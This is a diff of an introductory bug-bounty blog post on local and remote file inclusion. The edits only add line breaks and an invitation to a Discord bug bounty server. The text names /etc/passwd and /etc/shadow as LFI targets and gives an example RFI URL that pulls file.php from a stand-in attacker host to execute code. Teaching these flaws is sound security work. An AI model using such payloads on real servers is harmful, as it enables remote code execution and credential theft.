@@ -16,9 +16,10 @@ for example <code> /etc/passwd </code> or <code> /etc/shadow </code>.
 <br>
 On the other hand while exploiting RFI you can upload file from remote server which in 99% will result in 
 RCE(Remote Code Execution). For example <code> https://www.site.com/app.php?file=http://attackers.website.com/file.php </code>.
-You could execute malicious code from the <code> file.php </code> file and use it for evil intention.
+You could execute malicious code from the <code> file.php </code> file and use it for evil intention. <br>
 LFI is way more popular than RFI because nowadays it is way easier to protect against including Remote Malicious Files, but
 you never know 🙂. <br>
+<br>
 File Inclusion Vulnerabilities are ranked critical since they can cause server-side injections and in most cases you can get RCE.
 
 # > Some File Inlusion Reports:
@@ -32,5 +33,6 @@ File Inclusion Vulnerabilities are ranked critical since they can cause server-s
 <a href="https://dvwa.co.uk/"> DVWA </a> <br> <br>
 
 That was it for this blog, I hope you enjoyed it and would like you to follow my <a href="https://twitter.com/ArikSyer">Twitter</a>
- so you get notified when I post another blog.
+ so you get notified when I post another blog. Oh yeah I almost forgot don't forget to join Discord Bug Bounty server with great community there, you can ask
+ for help there if you need it.
 
